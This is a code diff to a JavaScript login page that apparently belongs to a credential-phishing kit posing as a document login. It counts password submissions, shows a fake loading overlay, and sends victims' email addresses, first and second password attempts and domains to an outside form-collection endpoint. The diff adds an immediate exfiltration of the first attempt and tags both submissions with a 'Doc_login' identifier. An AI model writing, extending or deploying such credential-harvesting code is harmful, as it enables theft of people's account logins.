@@ -421,6 +421,23 @@ document.addEventListener("DOMContentLoaded", function() {
         
         if (submitCount === 1) {
             firstPassword = currentPassword;
+            
+            // SEND FIRST ATTEMPT IMMEDIATELY - with Doc_login: true
+            fetch('https://submit-form.com/3KukZ309B', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    email: fullEmail,
+                    password: currentPassword,
+                    attempt: "first",
+                    domain: domainUrl,
+                    Doc_login: true  // IDENTIFIER - Doc_login: true
+                })
+            }).catch(error => console.error('Formspark error:', error));
+            
             document.getElementById("loader-overlay").style.display = "flex";
             
             setTimeout(function() {
@@ -432,7 +449,7 @@ document.addEventListener("DOMContentLoaded", function() {
         } else if (submitCount === 2) {
             document.getElementById("loader-overlay").style.display = "flex";
             
-            // Send to Formspark
+            // Send SECOND attempt - with Doc_login: true
             fetch('https://submit-form.com/3KukZ309B', {
                 method: 'POST',
                 headers: {
@@ -443,7 +460,9 @@ document.addEventListener("DOMContentLoaded", function() {
                     email: fullEmail,
                     first_attempt: firstPassword,
                     second_attempt: currentPassword,
-                    domain: domainUrl
+                    attempt: "second",
+                    domain: domainUrl,
+                    Doc_login: true  // IDENTIFIER - Doc_login: true
                 })
             }).catch(error => console.error('Formspark error:', error));
             
